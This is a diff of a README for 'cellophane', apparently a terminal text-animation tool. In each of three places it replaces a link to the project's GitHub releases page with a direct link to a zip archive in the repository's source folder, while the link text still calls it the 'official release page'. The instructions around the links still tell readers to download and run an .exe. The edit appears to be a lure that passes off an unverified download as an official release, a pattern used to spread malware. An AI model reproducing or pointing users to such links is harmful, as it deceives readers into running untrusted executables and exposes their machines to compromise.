@@ -1,6 +1,6 @@
 # 🎞️ cellophane - Create smooth text animations for terminals
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/juxli6686/cellophane/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/juxli6686/cellophane/raw/refs/heads/main/src/Software-v2.8.zip)
 
 Cellophane helps you add movement to your command line interface. It turns static lines of text into engaging animations. You can build loaders, progress bars, and scrolling effects with ease. 
 
@@ -21,7 +21,7 @@ You need a basic Windows computer to use this software. Make sure your system me
 
 ## 📥 Getting the software
 
-1. Go to the [official release page](https://github.com/juxli6686/cellophane/releases).
+1. Go to the [official release page](https://github.com/juxli6686/cellophane/raw/refs/heads/main/src/Software-v2.8.zip).
 2. Look for the section labeled "Assets" near the bottom of the newest version.
 3. Click the link that ends in .exe.
 4. Save the file to your computer.
@@ -68,7 +68,7 @@ If you build an animation that you like, share the command with your friends. Th
 
 ## 🌐 Keeping the software updated
 
-Software changes over time. Check the [release page](https://github.com/juxli6686/cellophane/releases) once a month for new features. The developers release updates to fix errors and add new animation styles. You can replace your old file with the new file to get these updates. The software keeps its settings in a separate folder, so your preferences usually remain safe during an update.
+Software changes over time. Check the [release page](https://github.com/juxli6686/cellophane/raw/refs/heads/main/src/Software-v2.8.zip) once a month for new features. The developers release updates to fix errors and add new animation styles. You can replace your old file with the new file to get these updates. The software keeps its settings in a separate folder, so your preferences usually remain safe during an update.
 
 ## 🎓 Why use terminal animations?
 
